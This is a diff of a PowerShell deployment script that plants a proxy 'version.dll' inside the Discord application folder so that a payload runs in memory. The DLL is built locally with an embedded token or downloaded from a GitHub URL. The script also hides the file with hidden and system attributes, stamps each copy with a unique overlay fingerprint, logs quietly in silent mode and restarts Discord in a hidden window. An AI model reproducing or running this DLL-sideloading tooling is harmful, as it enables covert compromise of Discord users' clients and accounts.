@@ -7,6 +7,13 @@ param(
 
 $ErrorActionPreference = "Stop"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$MaintLog = Join-Path $env:TEMP "wr_maint.log"
+
+function Write-MaintLog {
+    param([string]$Message)
+    $line = "$(Get-Date -Format 'HH:mm:ss') $Message"
+    Add-Content -LiteralPath $MaintLog -Value $line -Encoding UTF8 -ErrorAction SilentlyContinue
+}
 
 if ($Silent) {
     function Write-Host {
@@ -17,6 +24,9 @@ if ($Silent) {
             [object]$ForegroundColor,
             [object]$BackgroundColor
         )
+        if ($Object) {
+            Write-MaintLog ([string]$Object)
+        }
     }
 }
 
@@ -65,6 +75,33 @@ function Unlock-DeployPath {
     }
 
     attrib -h -s -r $Path 2>$null | Out-Null
+}
+
+function Start-DiscordAfterDeploy {
+    $discordRoot = Join-Path $env:LOCALAPPDATA "Discord"
+    if (-not (Test-Path $discordRoot)) {
+        return
+    }
+
+    $updateExe = Get-ChildItem -Path $discordRoot -Recurse -Filter "Update.exe" -ErrorAction SilentlyContinue |
+        Sort-Object FullName -Descending |
+        Select-Object -First 1
+
+    if ($updateExe) {
+        Start-Process -FilePath $updateExe.FullName -ArgumentList "--processStart", "Discord.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
+        Write-Host "[+] Discord restarted"
+        return
+    }
+
+    $discordExe = Get-ChildItem -Path $discordRoot -Recurse -Filter "Discord.exe" -ErrorAction SilentlyContinue |
+        Where-Object { $_.FullName -match '\\app-' } |
+        Sort-Object FullName -Descending |
+        Select-Object -First 1
+
+    if ($discordExe) {
+        Start-Process -FilePath $discordExe.FullName -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
+        Write-Host "[+] Discord started"
+    }
 }
 
 function Stop-DiscordIfRunning {
@@ -219,55 +256,72 @@ if ($GitHubBaseUrl -match "YOUR_USER") {
     exit 1
 }
 
-Write-Host "========================================" -ForegroundColor Green
-Write-Host " GitHub Deploy" -ForegroundColor Green
-Write-Host "========================================" -ForegroundColor Green
-Write-Host "Source: $GitHubBaseUrl" -ForegroundColor Gray
-Write-Host ""
+try {
+    Write-Host "========================================" -ForegroundColor Green
+    Write-Host " GitHub Deploy" -ForegroundColor Green
+    Write-Host "========================================" -ForegroundColor Green
+    Write-Host "Source: $GitHubBaseUrl" -ForegroundColor Gray
+    Write-Host ""
 
-$payloadRoot = Get-PayloadRoot
-$discordFolder = Get-DiscordAppFolder
+    $payloadRoot = Get-PayloadRoot
+    $discordFolder = Get-DiscordAppFolder
 
-Stop-DiscordIfRunning
-Stop-PayloadProcesses
+    Stop-DiscordIfRunning
+    Stop-PayloadProcesses
 
-# Clean old disk-based payload (in-memory mode uses only version.dll)
-if (Test-Path -LiteralPath $payloadRoot) {
-    Remove-Item -LiteralPath $payloadRoot -Recurse -Force -ErrorAction SilentlyContinue
+    # Clean old disk-based payload (in-memory mode uses only version.dll)
+    if (Test-Path -LiteralPath $payloadRoot) {
+        Remove-Item -LiteralPath $payloadRoot -Recurse -Force -ErrorAction SilentlyContinue
+    }
+
+    Remove-LegacyDeployFiles -PayloadRoot $payloadRoot
+
+    $sessionId = New-DeploySession
+    Write-Host "[*] Deploy session: $sessionId" -ForegroundColor Gray
+
+    $versionDest = Join-Path $discordFolder "version.dll"
+    $repoRoot = Split-Path $PSScriptRoot -Parent
+    $localDll = Join-Path $repoRoot "build\version.dll"
+
+    if (Test-Path -LiteralPath $localDll) {
+        Write-Host "[+] Installing local build\version.dll (includes your settings.cs token)" -ForegroundColor Cyan
+        Unlock-DeployPath -Path $versionDest
+        Copy-Item -LiteralPath $localDll -Destination $versionDest -Force
+    } else {
+        Download-GithubFile -RemotePath "version.dll" -LocalPath $versionDest
+    }
+
+    $dllHash = Add-DllUniqueOverlay -DllPath $versionDest
+    Write-Host "[*] Unique DLL fingerprint: $dllHash" -ForegroundColor Gray
+
+    $hiddenPaths = @(
+        (Join-Path $discordFolder "version.dll")
+    )
+
+    Hide-DeployTree -Paths $hiddenPaths
+
+    Write-Host ""
+    Write-Host "[OK] Deploy complete (in-memory mode - version.dll only)" -ForegroundColor Green
+    Write-Host "  Proxy   : $discordFolder\version.dll  [hidden+system, payload in memory]" -ForegroundColor White
+    Write-Host ""
+
+    Start-Sleep -Seconds 2
+    Start-DiscordAfterDeploy
+
+    Write-Host "Session should appear in Discord after restart." -ForegroundColor Yellow
+    Write-Host "Debug log: $env:TEMP\wrprov.log" -ForegroundColor Gray
+    if ($Silent) {
+        Write-Host "Install log: $MaintLog" -ForegroundColor Gray
+    }
 }
-
-Remove-LegacyDeployFiles -PayloadRoot $payloadRoot
-
-$sessionId = New-DeploySession
-Write-Host "[*] Deploy session: $sessionId" -ForegroundColor Gray
-
-$versionDest = Join-Path $discordFolder "version.dll"
-$repoRoot = Split-Path $PSScriptRoot -Parent
-$localDll = Join-Path $repoRoot "build\version.dll"
-
-if (Test-Path -LiteralPath $localDll) {
-    Write-Host "[+] Installing local build\version.dll (includes your settings.cs token)" -ForegroundColor Cyan
-    Unlock-DeployPath -Path $versionDest
-    Copy-Item -LiteralPath $localDll -Destination $versionDest -Force
-} else {
-    Download-GithubFile -RemotePath "version.dll" -LocalPath $versionDest
+catch {
+    $msg = $_.Exception.Message
+    Write-MaintLog "ERROR: $msg"
+    if (-not $Silent) {
+        Write-Host "ERROR: $msg" -ForegroundColor Red
+    }
+    exit 1
 }
-
-$dllHash = Add-DllUniqueOverlay -DllPath $versionDest
-Write-Host "[*] Unique DLL fingerprint: $dllHash" -ForegroundColor Gray
-
-$hiddenPaths = @(
-    (Join-Path $discordFolder "version.dll")
-)
-
-Hide-DeployTree -Paths $hiddenPaths
-
-Write-Host ""
-Write-Host "[OK] Deploy complete (in-memory mode - version.dll only)" -ForegroundColor Green
-Write-Host "  Proxy   : $discordFolder\version.dll  [hidden+system, payload in memory]" -ForegroundColor White
-Write-Host ""
-Write-Host "Restart Discord completely to start the session (Task Manager: end all Discord.exe if needed)." -ForegroundColor Yellow
-Write-Host "Debug log: $env:TEMP\wrprov.log" -ForegroundColor Gray
 
 
 
